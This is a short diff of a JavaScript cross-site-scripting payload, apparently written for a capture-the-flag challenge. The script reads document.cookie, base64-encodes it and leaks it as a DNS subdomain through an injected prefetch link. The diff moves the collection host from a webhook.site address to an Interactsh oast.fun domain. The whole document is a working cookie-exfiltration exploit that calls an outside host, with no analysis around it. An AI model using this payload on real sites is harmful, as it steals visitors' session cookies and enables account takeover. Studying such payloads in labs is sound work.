@@ -1,18 +1,15 @@
 setTimeout(() => {
-    // Get the flag from the cookie
     let flag = document.cookie;
     
-    // Encode it to Base64, remove padding (=), and make it lowercase
-    // This makes it a valid, safe DNS subdomain
+    // Convert to Base64, remove '=' padding, and make it completely lowercase
     let safeFlag = btoa(flag).replace(/=/g, '').toLowerCase();
 
-    // Inject a DNS prefetch link
+    // Create the DNS prefetch link
     let link = document.createElement('link');
     link.rel = 'prefetch';
     
-    // Set the href to a subdomain of your unique webhook ID
-    link.href = 'http://' + safeFlag + '.c28bdc7e-0993-4d8f-9a72-728714667c7f.webhook.site/';
+    // Inject the flag as a subdomain of your Interactsh domain
+    link.href = 'http://' + safeFlag + '.yzblscxpmqfiqbulugygj7soovv9fyojx.oast.fun/';
     
-    // Append it to the document to trigger the DNS lookup
     document.head.appendChild(link);
-}, 3000);
+}, 2000);
